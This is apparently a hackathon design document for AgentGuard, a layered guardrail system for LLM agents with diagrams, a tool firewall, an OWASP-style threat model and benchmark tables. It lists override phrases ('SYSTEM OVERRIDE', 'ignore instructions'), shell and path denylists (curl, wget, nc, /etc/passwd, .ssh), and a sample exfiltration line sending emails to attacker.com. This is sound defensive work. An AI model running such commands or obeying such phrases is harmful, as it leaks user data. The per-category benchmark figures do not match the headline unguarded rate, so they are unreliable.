# AgentGuard — Supporting Artifacts

![AgentGuard Logo](../assets/logo.png)

## Architecture & Design

**AI Unlocked 2026 · Track 5: Trustworthy AI · IIT Kharagpur**
**Team NamoFans** | Animesh Raj · Atul Singh · Devansh Gupta · Prem Agarwal · Mohd Faizan Khan

**Live prototype:** https://agentguard.exempl4r.xyz/

---

## Contents

| # | Section | Page |
|---|---|---|
| 1 | System Architecture Diagram | 3 |
| 2 | Guardian 4-Layer Defense-in-Depth Flow | 4 |
| 3 | End-to-End Request Lifecycle Flowchart | 5 |
| 4 | Tool Firewall Decision Tree | 6 |
| 5 | Developer Integration Flow (4-Step Onboarding) | 7 |
| 6 | Dashboard Wireframes | 8 |
| 7 | Threat Model — Attack Surface Map | 9 |
| 8 | Technology Stack & Component Map | 10 |
| 9 | Benchmark & Metrics Summary | 11 |
| 10 | Design Decisions Matrix | 12 |

---

## 1 — System Architecture Diagram

> High-level component layout and data-flow overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           AGENTGUARD SYSTEM                                 │
│                                                                             │
│  ┌────────────────────────────────────────────────────────────────────┐    │
│  │  DECORATOR LAYER  (agentguard/decorators.py)                        │    │
│  │                                                                    │    │
│  │  @guard_agent          @guard            @guard_input              │    │
│  │  Wraps full agent      Per-function      Input-only gate           │    │
│  │  (L1 + L2 + L4)        (L3 + L4)                                   │    │
│  │                                                                    │    │
│  │  GuardedToolRegistry — drop-in registry; every tool call guarded   │    │
│  └───────────────────────────┬────────────────────────────────────────┘    │
│                              │ intercepts every call                        │
│                              ▼                                              │
│  ┌────────────────────────────────────────────────────────────────────┐    │
│  │  GUARDIAN ORCHESTRATOR  (agentguard/guardian.py)                   │    │
│  │                                                                    │    │
│  │  validate_input()  →  validate_tool_call()  →  validate_output()   │    │
│  │                                                                    │    │
│  │  _notify_security_event()  ─────────────────────────────────────┐ │    │
│  └─────────────────────────────────────────────────────────────────┼─┘    │
│                                                                     │       │
│  ┌──────────────┐ ┌──────────────┐ ┌──────────────┐ ┌─────────────▼──┐   │
│  │  L1 INPUT    │ │  L4 ENGINES  │ │  L3 TOOL     │ │  OBSERVABILITY │   │
│  │  SHIELD      │ │              │ │  FIREWALL    │ │                │   │
│  │              │ │  L4RBACEngine│ │              │ │  OTel → Jaeger │   │
│  │  fast_inject │ │  (ABAC)      │ │  5 guardrails│ │  :4317         │   │
│  │  (33 regex)  │ │              │ │  C1 entity   │ │                │   │
│  │  prompt_     │ │  Behavioral  │ │  C2 MELON    │ │  SQLite        │   │
│  │  shields     │ │  Anomaly     │ │  C4 HITL/AITL│ │  audit.db      │   │
│  │  blocklists  │ │  Detector    │ │              │ │                │   │
│  └──────────────┘ └──────────────┘ └──────────────┘ └────────────────┘   │
│                                                                             │
│  ┌────────────────────┐   ┌───────────────────────────────────────────┐   │
│  │  L2 OUTPUT GUARD   │   │  CONFIG ENGINE                            │   │
│  │                    │   │                                           │   │
│  │  Azure AI Language │   │  agentguard.yaml  ←  agentguard init     │   │
│  │  (PII redaction)   │   │  AgentGuardConfig (config.py)            │   │
│  │  Azure Content     │   │                                           │   │
│  │  Safety (toxicity) │   │  Modes: enforce | monitor | dry-run      │   │
│  │  Groundedness LLM  │   │                                           │   │
│  └────────────────────┘   └───────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
```

| Component | Technology | Role |
|---|---|---|
| Decorator Layer | `@guard_agent` / `@guard` / `@guard_input` · GuardedToolRegistry | Zero-change agent wrapping; intercepts calls before and after LLM execution |
| Guardian Orchestrator | Pure Python in-process | Routes every call through L1→L4 in sequence; emits security events |
| Config Engine | `agentguard.yaml` + CLI (`agentguard init`) | YAML-driven policy; generated per-project via CLI scaffold |
| L1 Input Shield | Tier-0 blocklist · Tier-1 regex (33 patterns) · Azure Content Safety Prompt Shields | Blocks injection before any API call; ~40–60 % free-tier block rate |
| L2 Output Guard | Azure AI Language (PII) + Azure Content Safety (toxicity) + LLM-as-judge groundedness | SSN, keys, emails redacted; blocks toxic model outputs; detects hallucinations |
| L3 Tool Firewall | Pure Python; 5 guardrails + C1/C2/C4 checks | Validates tool-call arguments before execution; HITL escalation on ambiguous calls |
| L4 RBAC + Behavioral | `L4RBACEngine` (ABAC) + `BehavioralAnomalyDetector` (5 signals) | Composite score matrix: Z-score, Levenshtein, read→exfil chain, domain, entropy |
| Observability | OpenTelemetry → Jaeger (`:4317`) + SQLite audit log | Live SRE traces + tamper-evident compliance record |
| Dashboard | FastAPI · https://agentguard.exempl4r.xyz/ | Real-time OTel stream, layer breakdown, guarded vs unguarded toggle |

---

## 2 — Guardian 4-Layer Defense-in-Depth Flow

> Sequential security pipeline with block conditions per layer

```
  User / Orchestrator sends input
           │
           ▼
  ╔═══════════════════════════════════════════════════════════════════╗
  ║  L1  INPUT SHIELD                                                 ║
  ║                                                                   ║
  ║  Tier 0  Exact blocklist match        < 0.1 ms   FREE            ║
  ║  Tier 1  33-pattern regex             < 1 ms     FREE  ──▶ BLOCK ║
  ║  Tier 2  Azure AI Prompt Shields      ~ 50 ms    $$$   ──▶ BLOCK ║
  ║                                                                   ║
  ║  Patterns: SYSTEM OVERRIDE · ignore instructions · curl          ║
  ║            /etc/passwd · BEGIN PRIVATE KEY · jailbreak variants  ║
  ╚═══════════════════════════════════════════════════════════════════╝
           │  (clean inputs only)
           ▼
  Agent LLM runs — generates response + optional tool calls
           │
           ▼  (every tool call is intercepted before execution)
  ╔═══════════════════════════════════════════════════════════════════╗
  ║  L4  RBAC + BEHAVIORAL  (in-process, zero API cost)               ║
  ║                                                                   ║
  ║  ABAC: role × verb × resource_sensitivity × upstream_risk_score  ║
  ║  Outcome:  ALLOW │ DENY ──▶ BLOCK │ ELEVATE ──▶ HITL queue       ║
  ║                                                                   ║
  ║  Behavioral signals (composite score → BLOCK / ELEVATE / WARN):  ║
  ║  ① Z-score call frequency spike (threshold: 2.5σ)                ║
  ║  ② Levenshtein sequence divergence (threshold: 0.4)              ║
  ║  ③ read → exfil chain (CRITICAL weight 1.0 → instant BLOCK)      ║
  ║  ④ Unapproved outbound domain access                              ║
  ║  ⑤ Shannon entropy spike (multiplier: 1.5×)                      ║
  ╚═══════════════════════════════════════════════════════════════════╝
           │
           ▼
  ╔═══════════════════════════════════════════════════════════════════╗
  ║  L3  TOOL FIREWALL                                                ║
  ║                                                                   ║
  ║  file_system  │ path allowlist; blocks .env .pem .key .ssh /etc/ ║
  ║  sql_query    │ SELECT only — blocks DROP DELETE UPDATE INSERT   ║
  ║  shell_cmds   │ denylist: rm curl wget bash sh sudo eval exec    ║
  ║  http_get     │ HTTPS only; blocks 169.254.x.x IMDS + RFC-1918   ║
  ║  http_post    │ same + body ≤ 64 KB; blocks PII-in-body patterns ║
  ║                                                                   ║
  ║  C1  Azure entity recog on all tool args  ──▶ flag / BLOCK       ║
  ║  C2  MELON contrastive LLM check (opt-in, high-security agents)  ║
  ║  C4  HITL / AITL approval workflow for ELEVATE outcomes          ║
  ╚═══════════════════════════════════════════════════════════════════╝
           │  (tool executes only if all checks pass)
           ▼
  Tool returns result → Agent generates final response
           │
           ▼
  ╔═══════════════════════════════════════════════════════════════════╗
  ║  L2  OUTPUT GUARDRAIL                                             ║
  ║                                                                   ║
  ║  Azure AI Language  →  PII redaction (SSN, API keys, email)      ║
  ║  Azure Content Safety  →  Toxicity classification + filter       ║
  ║  LLM-as-judge Groundedness  →  3 strategies:                     ║
  ║    ① QnA (documents + query)  ② Summarization  ③ Query-only      ║
  ║    Score 1–5; threshold 3; blocks on ungrounded content          ║
  ╚═══════════════════════════════════════════════════════════════════╝
           │
           ▼
  ✓ SAFE RESPONSE → User
           │
  (All events written to OTel + SQLite in parallel via _notify_security_event())
```

---

## 3 — End-to-End Request Lifecycle Flowchart

> From raw user input to safe response — every decision node

```
  ┌──────────────────────────────────────────────────────────────────────┐
  │  USER / ORCHESTRATOR                                                  │
  │  Raw prompt string                                                    │
  └─────────────────────────────┬────────────────────────────────────────┘
                                │
                                ▼
  ┌──────────────────────────────────────────────────────────────────────┐
  │  STEP 1  Guardian.validate_input(prompt)                              │
  │                                                                      │
  │  ┌─────────────┐     match?    ┌──────────────────────────────────┐  │
  │  │ Tier 0/1    │──── YES ─────▶│  InputBlockedError (< 1ms)       │  │
  │  │ regex/list  │               │  No Azure call made              │  │
  │  └──────┬──────┘               └──────────────────────────────────┘  │
  │         │ no match                                                    │
  │         ▼                                                             │
  │  ┌─────────────┐  injection?   ┌──────────────────────────────────┐  │
  │  │ Tier 2      │──── YES ─────▶│  InputBlockedError (~50ms)       │  │
  │  │ Azure Prompt│               └──────────────────────────────────┘  │
  │  │ Shields     │                                                      │
  │  └──────┬──────┘                                                      │
  │         │ PASS                                                        │
  └─────────┼────────────────────────────────────────────────────────────┘
            │
            ▼
  ┌──────────────────────────────────────────────────────────────────────┐
  │  STEP 2  Agent function executes                                      │
  │  LLM generates response text + optional tool_calls[]                 │
  └─────────────────────────────┬────────────────────────────────────────┘
            │ (for each tool call)
            ▼
  ┌──────────────────────────────────────────────────────────────────────┐
  │  STEP 3  Guardian.validate_tool_call(name, args, context)            │
  │                                                                      │
  │  3a  L4 RBAC       DENY  ──▶  ToolCallBlockedError                  │
  │      role × verb × sensitivity × risk_score                         │
  │      ELEVATE ──────────────▶  HITL queue (async approval)           │
  │                   ALLOW  ──▶  continue                              │
  │                                                                      │
  │  3b  L3 Tool       BLOCK ──▶  ToolCallBlockedError                  │
  │      Firewall      (5 rule-based guardrails on args)                │
  │                   PASS  ──▶  continue                              │
  │                                                                      │
  │  3c  C1 Entity     flag  ──▶  ToolCallBlockedError (PII in args)    │
  │      Recog                                                           │
  │                   PASS  ──▶  continue                              │
  │                                                                      │
  │  3d  C2 MELON      flag  ──▶  ToolCallBlockedError (indirect inject)│
  │      (opt-in)                                                        │
  └─────────────────────────────┬────────────────────────────────────────┘
            │ all checks pass
            ▼
  ┌──────────────────────────────────────────────────────────────────────┐
  │  STEP 4  tool.execute()   returns result to agent                    │
  └─────────────────────────────┬────────────────────────────────────────┘
            │
            ▼
  ┌──────────────────────────────────────────────────────────────────────┐
  │  STEP 5  Guardian.validate_output(response_text)                     │
  │                                                                      │
  │  PII redaction     →  SSN / API keys / email masked in response     │
  │  Toxicity filter   →  OutputBlockedError if toxic                   │
  │  Groundedness      →  OutputBlockedError if score < threshold       │
  └─────────────────────────────┬────────────────────────────────────────┘
            │
            ▼
  ┌──────────────────────────────────────────────────────────────────────┐
  │  STEP 6  Safe response delivered to user                             │
  │  Full trace written to OTel (Jaeger) + SQLite audit.db              │
  └──────────────────────────────────────────────────────────────────────┘
```

| Step | Actor | Input | Output / Decision |
|---|---|---|---|
| 1 | User / Orchestrator | Raw prompt string | Passed to `Guardian.validate_input()` |
| 2 | L1 — Tier 0/1 | Prompt string | Exact match or regex → BLOCK (no API cost) |
| 3 | L1 — Tier 2 | Prompt string (ambiguous) | Azure Prompt Shields → ALLOW or BLOCK |
| 4 | Agent function | Clean input | LLM generates response + optional tool calls |
| 5 | L4 RBAC | Tool name + args + caller role | ALLOW / DENY / ELEVATE |
| 5a | HITL queue | (on ELEVATE) | Human approves → resume; rejects → DENY |
| 6 | L3 Tool Firewall | Tool name + validated args | Arg-level check; ALLOW or BLOCK |
| 6a | C1 Entity recog | Tool arguments | PII-in-args detection → flag or BLOCK |
| 6b | C2 MELON (opt-in) | Tool call + context | Contrastive LLM cross-check → flag |
| 7 | Tool | Approved call | Executes; result returned to agent |
| 8 | L2 Output | Agent response text | PII redaction + toxicity filter + groundedness → safe text |
| 9 | User | Safe response | Delivered; full trace written to OTel + SQLite |

---

## 4 — Tool Firewall Decision Tree

> L3 argument-level validation logic for each tool class

```
  tool_call arrives
        │
        ▼
  ┌─────────────────────────────────────────────────────────────────┐
  │  Classify tool_name                                              │
  │                                                                 │
  │  file_system?   sql_query?   shell_cmds?   http_get?   http_post│
  └──┬──────────────┬────────────┬─────────────┬──────────┬─────────┘
     │              │            │             │          │
     ▼              ▼            ▼             ▼          ▼
  ┌──────────┐  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐
  │ Path     │  │ SQL      │ │ Command  │ │ URL      │ │ URL +    │
  │ Guard    │  │ Guard    │ │ Guard    │ │ Guard    │ │ Body     │
  │          │  │          │ │          │ │          │ │ Guard    │
  │ Allowed? │  │ SELECT   │ │ In allow-│ │ HTTPS?   │ │ HTTPS?   │
  │ path?    │  │ only?    │ │ list?    │ │ Domain   │ │ Body ≤64K│
  └────┬─────┘  └────┬─────┘ └────┬─────┘ └────┬─────┘ └────┬─────┘
       │             │            │             │            │
  .env/.pem?   DROP/DELETE?   rm/curl/bash? 169.254.x.x?  PII body?
       │             │            │             │            │
       ▼             ▼            ▼             ▼            ▼
     BLOCK         BLOCK        BLOCK         BLOCK        BLOCK
       │             │            │             │            │
      else          else         else          else         else
       │             │            │             │            │
       └─────────────┴────────────┴─────────────┴────────────┘
                                  │
                                  ▼
                         C1 — Azure Entity Recognition
                         Scan all args for PII entities
                                  │
                    PII found? ───┴─── No PII
                         │                │
                       BLOCK            C2 MELON (if enabled)
                                          │
                               High similarity? ── No
                                    │                │
                                  BLOCK           C4 HITL
                                               (if ELEVATE)
                                                    │
                                              Human approved?
                                              YES ──┴── NO
                                               │         │
                                           ALLOW       BLOCK
```

| Tool Class | Allowed Pattern | Block Condition | Escalate Condition |
|---|---|---|---|
| `file_system` | Path within allowlist (e.g. `/workspace/**`) | `.env`, `.pem`, `.key`, `.ssh`, `/etc/*`; paths outside allowlist | Sensitive dir access not in allowlist |
| `sql_query` | `SELECT` statements only | `DROP`, `DELETE`, `UPDATE`, `INSERT`, `TRUNCATE`, `EXEC` | Tables flagged as PII-sensitive in ABAC policy |
| `shell_cmds` | Allowlisted commands (`cat`, `ls`, `python3` …) | `rm`, `curl`, `wget`, `bash`, `sh`, `sudo`, `eval`, `exec`, `nc` | Any unfamiliar binary or pipe to network tool |
| `http_get` | HTTPS + domain allowlist; no RFC-1918 / `169.254.x.x` | HTTP (plain), `169.254.x.x` IMDS, private range IPs | Allowlisted domain + unusual query param patterns |
| `http_post` | As above + body size ≤ 64 KB | Same as `http_get` + body > 64 KB or encoded payloads | Allowlisted domain + large body referencing email/PII tokens |

---

## 5 — Developer Integration Flow (4-Step Onboarding)

> Minimum integration: 3 lines of code

```python
from agentguard import guard_agent

@guard_agent(config='agentguard.yaml')
def my_agent(user_message: str) -> str:
    return call_llm(user_message)  # unchanged
```

```
  ┌──────────────────────────────────────────────────────────────────────┐
  │  Step 1 — agentguard init                                            │
  │                                                                      │
  │  • Run CLI scaffold in project root                                  │
  │  • Generates agentguard.yaml with policy defaults                   │
  │  • Generates .env.example with required Azure key slots              │
  │  • Outputs README snippet for decorator usage                        │
  └──────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
  ┌──────────────────────────────────────────────────────────────────────┐
  │  Step 2 — Fill .env                                                  │
  │                                                                      │
  │  CONTENT_SAFETY_ENDPOINT   = https://agentguard.cognitiveservices…  │
  │  CONTENT_SAFETY_KEY        = <key>                                   │
  │  AZURE_LANGUAGE_ENDPOINT   = https://lang-anal-ag.cognitiveservices… │
  │  AZURE_LANGUAGE_KEY        = <key>                                   │
  │  OPENAI_API_KEY            = <TrueFoundry or any OpenAI endpoint>   │
  │  OPENAI_BASE_URL           = https://llm-gateway.truefoundry.ai/… │
  │  OPENAI_MODEL              = gemini-2.0-flash-thinking-exp          │
  └──────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
  ┌──────────────────────────────────────────────────────────────────────┐
  │  Step 3 — @guard_agent decorator                                     │
  │                                                                      │
  │  • Add one decorator to existing agent function — zero refactor     │
  │  • @guard_agent(config='agentguard.yaml')                           │
  │  • Registers GuardedToolRegistry for each tool via tool slots       │
  │  • All 4 layers activate automatically on first call                │
  └──────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
  ┌──────────────────────────────────────────────────────────────────────┐
  │  Step 4 — agentguard test                                            │
  │                                                                      │
  │  • Runs 25+ adversarial scenarios via Promptfoo (npx)               │
  │  • Runs OWASP Agentic Top 10 suite via DeepTeam                     │
  │  • Reports per-layer block rate and false-positive count            │
  │  • Outputs HTML test report + appends to SQLite audit log           │
  └──────────────────────────────────────────────────────────────────────┘
```

**Integration patterns available:**

| Pattern | Decorator / API | Layers active | Best for |
|---|---|---|---|
| A | `@guard_agent` | L1 + L2 + L4 | Simple agents, single entry-point |
| B | `@guard` + `@guard_input` | L1 + L3 + L4 | Fine-grained per-function control |
| C | `GuardedToolRegistry` | L3 + L4 + C1/C2/C4 | ReAct agents with explicit tool loop |
| D | `Guardian` API | All layers, manual | Custom integration; maximum control |

---

## 6 — Dashboard Wireframes

> Live at https://agentguard.exempl4r.xyz/ — two key screens

```
  ┌─────────────────────────────────────────────────────────────────────┐
  │  /  — AUDIT & TRACE STREAM                                          │
  │                                                                     │
  │  ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌────────────┐      │
  │  │ Total      │ │ Blocked    │ │ 24h Pass   │ │ Avg        │      │
  │  │ Checks     │ │ Events     │ │ Rate       │ │ Latency    │      │
  │  │   247      │ │   19       │ │  92.3%     │ │  1.4s      │      │
  │  └────────────┘ └────────────┘ └────────────┘ └────────────┘      │
  │                                                                     │
  │  Layer breakdown                    Live trace feed                │
  │  ┌─────────────────────┐           ┌─────────────────────────────┐│
  │  │ L1 Input   ████ 42% │           │ 11:52:01 BLOCKED L1 [CRIT]  ││
  │  │ L2 Output  ██   18% │           │ "SYSTEM OVERRIDE…"          ││
  │  │ Tool FW    ███  31% │           │ → fast_inject_detect 0.3ms  ││
  │  │ L4 RBAC    █     9% │           │                             ││
  │  └─────────────────────┘           │ 11:52:03 BLOCKED L3 [HIGH] ││
  │                                    │ sql_query: "DROP TABLE…"    ││
  │  Audit log table                   │ → sql_guard 2ms             ││
  │  ┌─────────────────────────────────┴─────────────────────────────┐│
  │  │ ts       │ layer │ decision │ tool/input │ reason             ││
  │  │ 11:52:01 │ L1    │ BLOCK    │ user_input │ regex:SYSTEM_OVR  ││
  │  │ 11:52:03 │ L3    │ BLOCK    │ sql_query  │ DROP TABLE        ││
  │  └──────────────────────────────────────────────────────────────┘│
  └─────────────────────────────────────────────────────────────────────┘

  ┌─────────────────────────────────────────────────────────────────────┐
  │  /demo  — ATTACK DEMO CONSOLE                                       │
  │                                                                     │
  │  Agent: [FinancialBot ▼]    Mode: [● GUARDED  ○ UNGUARDED]         │
  │                                                                     │
  │  Pre-built attacks:                                                 │
  │  ┌─────────────────────────────────────────────────────────────┐   │
  │  │ [▶ Prompt Injection]  [▶ SQL Drop]  [▶ Data Exfil]         │   │
  │  │ [▶ PII Leak]          [▶ Shell RCE] [▶ Privilege Escalation]│   │
  │  └─────────────────────────────────────────────────────────────┘   │
  │                                                                     │
  │  Custom prompt: ┌──────────────────────────────────────────────┐   │
  │                 │ Type your attack prompt here…                │   │
  │                 └──────────────────────────────────────────────┘   │
  │  [Run Attack]                                                       │
  │                                                                     │
  │  Result:  ╔══════════════════╗                                      │
  │           ║  🔴 BLOCKED      ║  Layer: L1 · Duration: 0.41s        │
  │           ║  fast_inject     ║  Reason: regex match SYSTEM OVERRIDE │
  │           ╚══════════════════╝                                      │
  │           ▼ Details: blocked_by=fast_injection_detect              │
  └─────────────────────────────────────────────────────────────────────┘
```

| Screen | Route | Key Elements | Data Source |
|---|---|---|---|
| Main Dashboard | `/` | Real-time OTel trace stream; per-layer block counts; audit log table; risk-score timeline | OTel → Jaeger collector; SQLite `audit.db` |
| Demo Console | `/demo` | Guarded / Unguarded toggle switch; pre-built attack scenario picker; custom prompt textarea; side-by-side response diff with layer annotations | Live AgentGuard Guardian via FastAPI endpoint |
| Settings | `/config` | YAML editor for `agentguard.yaml`; RBAC role matrix; tool allowlist editor; C2/MELON toggle | `agentguard.yaml` on disk |
| Incident Detail | `/incident/:id` | Full trace span tree; raw tool-call args; blocked payload (sanitised); HITL decision history | SQLite incident table + OTel trace ID lookup |

---

## 7 — Threat Model — Attack Surface Map

> OWASP Agentic Top 10 coverage mapped to AgentGuard layers

```
  OWASP AGENTIC TOP 10  ×  AGENTGUARD LAYER COVERAGE

  AT-01 Prompt Injection      ████████████████████  100%  L1 Tier 0–2 + L3 arg
  AT-02 Excessive Agency      █████████████████     85%   L3 Firewall + L4 DENY
  AT-03 Memory Poisoning      ██████████████        70%   L1 regex + L3 check *
  AT-04 Insecure Tool Use     ████████████████████  100%  L3 sql_query + L4 verb
  AT-05 Resource Exhaustion   ████████████████      80%   L4 Z-score + HITL
  AT-06 Data Exfiltration     ████████████████████  100%  L3 http allowlist + L4
  AT-07 Privilege Escalation  ████████████████████  100%  L4 ABAC + cross-agent
  AT-08 Supply Chain Attack   ███████████████       75%   L3 registry + L4 RBAC
  AT-09 Hallucination Exploit ████████████████      80%   L2 filter + C2 MELON
  AT-10 Unsafe Coordination   ████████████          60%   L4 inter-agent RBAC **

  * AT-03: Spotlighting (Azure AI Foundry endpoint) disabled in prototype;
    Tier-1 regex covers known injection patterns.
  ** AT-10: Inter-agent RBAC present; full DAG coordination check is roadmap.
```

| OWASP Agentic Risk | Real CVE / Example | Primary Layer | Secondary Layer |
|---|---|---|---|
| AT-01 Prompt Injection | EchoLeak CVE-2025-32711 (CVSS 9.3) | L1 Tier 0–2 | L3 arg check |
| AT-02 Excessive Agency | Agent writes/deletes beyond scope | L3 Tool Firewall | L4 RBAC DENY |
| AT-03 Memory Poisoning | Adversarial PDF embeds override | L1 Spotlighting* | L3 content check |
| AT-04 Insecure Tool Use | SQL DROP via injected query | L3 `sql_query` rule | L4 verb check |
| AT-05 Resource Exhaustion | Runaway tool-call loops | L4 Behavioral Z-score | HITL ELEVATE |
| AT-06 Data Exfiltration | `curl attacker.com?data=$EMAILS` | L3 `http_*` domain allowlist | L4 read→exfil chain |
| AT-07 Privilege Escalation | Agent assumes admin role mid-session | L4 ABAC role lock | L4 cross-agent check |
| AT-08 Supply Chain Attack | Malicious tool injected at runtime | L3 tool registry check | L4 RBAC deny |
| AT-09 Hallucination Exploit | Fake tool result triggers bad action | L2 output filter | C2 MELON (opt-in) |
| AT-10 Unsafe Coordination | Agent A commands Agent B improperly | L4 inter-agent RBAC | Guardian DAG check |

---

## 8 — Technology Stack & Component Map

> Every dependency, its role, and its deployment context

```
  ┌─────────────────────────────────────────────────────────────────────┐
  │                    AZURE CLOUD SERVICES                             │
  │                                                                     │
  │  ┌──────────────────────────────────────────────────────────────┐  │
  │  │  Azure AI Content Safety                                      │  │
  │  │  ┌─────────────────┐  ┌──────────────────┐                  │  │
  │  │  │ Prompt Shields   │  │ Content Filters   │                  │  │
  │  │  │ (L1 Tier 2)      │  │ (L1 + L2 toxicity)│                  │  │
  │  │  └─────────────────┘  └──────────────────┘                  │  │
  │  └──────────────────────────────────────────────────────────────┘  │
  │  ┌──────────────────────────────────────────────────────────────┐  │
  │  │  Azure AI Language (Text Analytics)                           │  │
  │  │  ┌─────────────────┐  ┌──────────────────┐                  │  │
  │  │  │ PII Recognition  │  │ Entity Recognition│                  │  │
  │  │  │ (L2 redaction)   │  │ (C1 tool args)    │                  │  │
  │  │  └─────────────────┘  └──────────────────┘                  │  │
  │  └──────────────────────────────────────────────────────────────┘  │
  └─────────────────────────────────────────────────────────────────────┘
                              │
  ┌─────────────────────────────────────────────────────────────────────┐
  │                   IN-PROCESS PYTHON                                 │
  │                                                                     │
  │  Guardian Orchestrator (guardian.py)                                │
  │       │                                                             │
  │       ├── L1: fast_injection_detect.py  (33-pattern regex)         │
  │       ├── L1: prompt_shields.py          (Azure REST)              │
  │       ├── L1: blocklist_manager.py       (Azure blocklists)        │
  │       ├── L2: pii_detector.py            (Azure SDK)               │
  │       ├── L2: output_toxicity.py         (Content Safety)          │
  │       ├── L2: groundedness_detector.py   (LLM-as-judge)            │
  │       ├── L3: tool_specific_guards.py    (5 rule guardrails)       │
  │       ├── L3: tool_input_analyzer.py     (C1 entity recog)         │
  │       ├── L3: melon_detector.py          (C2 contrastive)          │
  │       ├── L3: approval_workflow.py       (C4 HITL/AITL)            │
  │       ├── L4: l4_rbac.py                 (ABAC engine)             │
  │       ├── L4: l4_behavioral.py           (5-signal anomaly)        │
  │       ├── telemetry.py                   (OTel spans)              │
  │       └── audit_log.py                   (SQLite writes)           │
  └─────────────────────────────────────────────────────────────────────┘
                              │
  ┌─────────────────────────────────────────────────────────────────────┐
  │                   OBSERVABILITY PIPELINE                            │
  │                                                                     │
  │  OTel SDK ──▶ OTLP gRPC (:4317) ──▶ Jaeger (sidecar/cloud)        │
  │  SQLite audit.db ──▶ FastAPI dashboard ──▶ SSE stream to browser   │
  └─────────────────────────────────────────────────────────────────────┘
```

| Layer / Concern | Technology | Version / Note | Deployment |
|---|---|---|---|
| Language & packaging | Python 3.11+ · uv | 3.11 min | In-process |
| L1 — injection detect | Azure AI Content Safety (Prompt Shields) | GA | Azure Cloud |
| L1 — fast path | 33-pattern offline regex blocklist | Custom | In-process, <1 ms |
| L2 — PII redaction | Azure AI Language | GA | Azure Cloud |
| L2 — toxicity | Azure AI Content Safety | GA | Azure Cloud |
| L2 — groundedness | LLM-as-judge (OpenAI SDK → TrueFoundry) | Custom | In-process, ~1–3s |
| L3/L4 — firewall + RBAC | Pure Python, zero external deps | Custom | In-process |
| LLM gateway | TrueFoundry (OpenAI-compatible) | Any endpoint | Cloud / self-hosted |
| Observability — live | OpenTelemetry → Jaeger | OTEL 1.x | Sidecar / cloud |
| Observability — audit | SQLite (tamper-evident) | Built-in | Local file |
| Red-team — prompts | Promptfoo (npx) | CLI | Dev / CI |
| Red-team — OWASP | DeepTeam | OWASP Top 10 | Dev / CI |
| Dashboard API | FastAPI | 0.111+ | Containerised |
| Dashboard hosting | https://agentguard.exempl4r.xyz/ | Live prototype | Cloud PaaS |
| Performance cache | Redis (config-stubbed) | Roadmap item | Azure Cache for Redis |

---

## 9 — Benchmark & Metrics Summary

> Adversarial test results across two independent runs

```
  ┌──────────────┐   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐
  │  95 – 97.5%  │   │     96%      │   │    0.65 s    │   │     410      │
  │  Attack Block│   │  CRITICAL    │   │  Avg Block   │   │  Unit Tests  │
  │    Rate      │   │  Block Rate  │   │  (fast path) │   │  0 failures  │
  └──────────────┘   └──────────────┘   └──────────────┘   └──────────────┘
   vs 7.5% unguarded   adversarial suite   no API needed
```

| Run | Agent | Tests | Secure % | Improvement | Notes |
|---|---|---|---|---|---|
| Run 1 | GuardedBot | 40 | 97.5 % | — | |
| Run 1 | Unguarded | 40 | 47.5 % | +50.0 pp | Guarded vs unguarded |
| Run 2 | GuardedBot | 40 | 95.0 % | — | |
| Run 2 | Unguarded | 40 | 7.5 % | +87.5 pp | Worst-case baseline |
| Combined | CRITICAL attacks | — | 96 % blocked | — | Adversarial suite |
| Fast path | Offline tiers 0/1 | — | 0.65 s avg | — | No Azure API call needed |

**Test toolchain:** Promptfoo (25+ adversarial scenarios, npx runner) + DeepTeam (OWASP Agentic Top 10). All 410 unit tests pass with 0 failures.

**Category breakdown (Run 2 — worst case):**

| Category | Tests | Guarded | Unguarded |
|---|---|---|---|
| Prompt Injection | 6 | 6/6 (100%) | 6/6 (100%) |
| SQL Attack | 5 | 4/5 (80%) | 5/5 (100%) |
| File System | 5 | 5/5 (100%) | 5/5 (100%) |
| Network Exfiltration | 5 | 5/5 (100%) | 5/5 (100%) |
| Shell Attack | 5 | 5/5 (100%) | 5/5 (100%) |
| Privilege Escalation | 4 | 4/4 (100%) | 3/4 (75%) |
| PII Exfiltration | 3 | 2/3 (67%) | 2/3 (67%) |
| Multi-Vector | 3 | 3/3 (100%) | 2/3 (67%) |
| Supply Chain | 2 | 2/2 (100%) | 2/2 (100%) |

**Severity block rate (combined):** CRITICAL 96% · HIGH 93–100% · MEDIUM 100%

**Latency profile:**

| Metric | Value |
|---|---|
| Fast-path block (offline regex / blocklist) | 0.65 s avg |
| Azure-backed block (Prompt Shields + Content Safety) | 3.10 s avg |
| Fastest single block recorded | 0.41 s |

---

## 10 — Design Decisions Matrix

> Key architectural choices, rationale, and explicit trade-offs

| Decision | Choice Made | Rationale | Trade-off / Deferred Alt. |
|---|---|---|---|
| L2 provider | Azure AI Language + Content Safety | Single trust boundary with L1; avoids second external model dependency | Guardrails AI deferred as optional future plugin |
| Tiered L1 (offline first) | Tier 0/1 regex before Azure API call | ~40–60 % blocked free at <1 ms; Azure only for ambiguous inputs | Regex misses novel patterns → Tier 2 catches those |
| ABAC ELEVATE outcome | 3rd outcome: ELEVATE → HITL queue | Binary ALLOW/DENY blocks valid edge-cases; ELEVATE routes to human without dropping the task | Adds async complexity; requires HITL UI / webhook |
| C2 MELON opt-in | Disabled by default; enabled in YAML | Requires 2 LLM calls (2× cost); only justified for medical/financial/legal agents | Always-on = 2× cost; config flag is the balance |
| Dual observability (OTel + SQLite) | OTel for live SRE; SQLite for forensics | OTel spans are ephemeral; compliance audits need local record independent of cloud connectivity | Two writes per event; acceptable overhead |
| Redis caching | Config-stubbed (not wired yet) | Architecture validated; wiring deferred to avoid prototype complexity | Hot path is ~200 ms instead of target <50 ms |
| Spotlighting | Azure AI Foundry endpoint required | Best-in-class indirect injection defence for document-grounded agents | Not available in prototype; falls back to Tier-1 regex |
| AutoGen adapter | Dependency installed; adapter not written | AutoGen/Magentic-One as primary target framework; adapter is straightforward given decorator pattern | Next-step item with mentorship |

---

*AgentGuard · AI Unlocked 2026 · Track 5: Trustworthy AI · IIT Kharagpur — Team NamoFans*
*Live demo: https://agentguard.exempl4r.xyz/*
